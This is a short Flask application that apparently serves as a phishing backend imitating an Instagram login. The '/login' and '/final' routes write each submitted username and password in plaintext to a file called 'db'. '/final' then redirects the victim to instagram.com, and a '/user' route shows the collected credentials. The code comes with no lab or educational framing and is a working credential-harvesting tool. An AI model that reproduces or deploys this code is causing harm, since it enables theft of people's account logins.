from flask import render_template
from flask import Flask, redirect, url_for, request
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def dashboard():
   return render_template('index.html',data=False)


@app.route('/login',methods = ['POST', 'GET'])
def login():
   if request.method == 'POST':
      user = request.form['user']
      passw = request.form['pass']
      f = open("db", "a")
      f.write("\n"+user+' | '+passw+' |'+str(datetime.now()))
      f.close()
      return render_template('index.html',data=True)
   else:
      return redirect('/')


@app.route('/final',methods = ['POST', 'GET'])
def final():
   if request.method == 'POST':
      user = request.form['user']
      passw = request.form['pass']
      f = open("db", "a+")
      f.write("\n"+user+' | '+passw+' |'+str(datetime.now()))
      f.close()
      return redirect('https://instagram.com')
   else:
      return redirect('/')

@app.route('/user',methods = ['POST', 'GET'])
def data():

   f = open("db", "a+")
   data = f.read()
   f.close()
   return render_template('data.html',data=data)



if __name__ == '__main__':
   app.run(debug = True,port=3000)
